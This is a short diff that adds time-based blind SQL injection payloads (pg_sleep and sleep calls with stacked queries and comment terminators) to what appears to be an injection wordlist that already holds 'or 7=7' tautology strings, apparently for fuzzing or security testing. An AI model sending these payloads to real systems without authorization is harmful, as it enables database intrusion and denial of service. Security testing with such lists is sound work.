@@ -73,3 +73,11 @@ a@
 \" or 7=7 --
 ' or 7=7 #
 \" or 7=7 #
+something; SELECT pg_sleep(10) --
+something; SELECT pg_sleep(10);--
+something;SELECT(pg_sleep(10))--
+--+-
+--
+some_legal_value LIMIT 1 OFFSET 1) select pg_sleep(10)-- -
+something' or sleep(3)--
+something)) AND sleep(3)--
